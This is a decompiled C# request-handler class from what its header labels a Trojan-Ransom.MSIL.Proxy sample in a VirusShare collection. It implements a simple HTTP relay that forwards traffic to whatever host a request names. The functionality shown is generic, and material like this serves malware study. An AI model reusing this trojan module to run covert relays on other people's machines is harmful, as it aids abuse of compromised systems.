// Decompiled with JetBrains decompiler
// Type: ProxyService.RequestHandler
// Assembly: ProxyService, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4BAA6272-82AC-4A0F-9D22-E6349EB55251
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.MSIL.Proxy.a-86c09672906047dffe2aa9fa0a93ad93a7a266c337359ce4c05df48549a6a032.exe

using System;
using System.Net;
using System.Net.Sockets;
using System.Text;

namespace ProxyService
{
  public class RequestHandler
  {
    private readonly Socket _serverSocket;

    public RequestHandler(Socket serverSocket) => this._serverSocket = serverSocket;

    public void Handle()
    {
      string header1 = this.GetHeader(this._serverSocket);
      string hostNameOrAddress = this.AnalyzeHeader(header1);
      Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
      IPEndPoint remoteEP = new IPEndPoint(Dns.GetHostAddresses(hostNameOrAddress)[0], 80);
      socket.Connect((EndPoint) remoteEP);
      this.SendRequest(socket, header1);
      string header2 = this.GetHeader(socket);
      if (!string.IsNullOrEmpty(header2))
      {
        this.SendRequest(this._serverSocket, header2);
        byte[] buffer = new byte[1024];
        int size = socket.Receive(buffer);
        while (size > 0)
        {
          try
          {
            this._serverSocket.Send(buffer, size, SocketFlags.None);
            size = socket.Receive(buffer);
          }
          catch (Exception ex)
          {
            ProxyServer.dbg(ex.Message);
          }
        }
      }
      this._serverSocket.Shutdown(SocketShutdown.Both);
      this._serverSocket.Close();
    }

    public string GetHeader(Socket socket)
    {
      string header = "";
      while (true)
      {
        try
        {
          do
          {
            byte[] numArray = new byte[1];
            int count = socket.Receive(numArray);
            header += Encoding.ASCII.GetString(numArray, 0, count);
            if (header.IndexOf("\r\n\r\n", StringComparison.Ordinal) > -1)
              break;
          }
          while (header.IndexOf("\n\n", StringComparison.Ordinal) <= -1);
          break;
        }
        catch (Exception ex)
        {
          ProxyServer.dbg(ex.Message);
        }
      }
      return header;
    }

    public string AnalyzeHeader(string header)
    {
      string str = "";
      string[] strArray1 = header.Split('\n');
      for (int index = 1; index < strArray1.Length; ++index)
      {
        string[] strArray2 = strArray1[index].Split(':');
        if (strArray2.Length >= 2 && strArray2[0].Trim().ToLower().Equals("host"))
          str = strArray2[1].Trim();
      }
      return str;
    }

    public void SendRequest(Socket socket, string header)
    {
      byte[] bytes = Encoding.ASCII.GetBytes(header);
      socket.Send(bytes, bytes.Length, SocketFlags.None);
    }
  }
}
